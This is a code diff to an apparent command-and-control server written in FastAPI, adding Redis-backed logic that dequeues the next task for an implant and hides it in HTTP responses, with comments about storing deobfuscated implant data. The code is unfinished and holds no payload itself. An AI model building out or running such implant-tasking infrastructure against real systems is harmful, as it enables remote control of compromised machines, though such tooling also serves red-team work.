@@ -23,6 +23,7 @@ from ..malc2 import (
     HttpPostBlockClientParser,
     HttpConfigBlockServerParser,
 )
+from ...modules.redis_functions import RedisImplantTaskService
 import re
 
 app = FastAPI
@@ -348,12 +349,19 @@ async def http_get(request: Request) -> Response:
     # pass in block to respective class
     emitter = HttpGetBlockServerParser(mp.http_get.server)
 
-    # get the stuff we need from it
-    headers = emitter.headers()
-    data = emitter.generate_data()
-
     # note, payload would need to be inserted somehwere here too.  Ex,
     # redis lookup for next task -> insert where print it
+    # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+    its = RedisImplantTaskService(...)  # still need to pull out ID
+    data = its.dequeue_task()
+    # if not data... handle this
+
+    # get the stuff we need from it
+    headers = emitter.headers()
+    data = emitter.generate_data(data)
+
+    # some redis conn
+    # based on implant_id, get next task
 
     # based on terminationstatement, need to store data in certain location
     # Ex: header: store in header
@@ -434,6 +442,11 @@ async def http_get_uri(request: Request, data: str) -> Response:
 
     # note, payload would need to be inserted somehwere here too.  Ex,
     # redis lookup for next task -> insert where print it
+
+    # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+    # some redis conn
+    # based on implant_id, push de-obsfucated data to redis
 
     # based on terminationstatement, need to store data in certain location
     # Ex: header: store in header
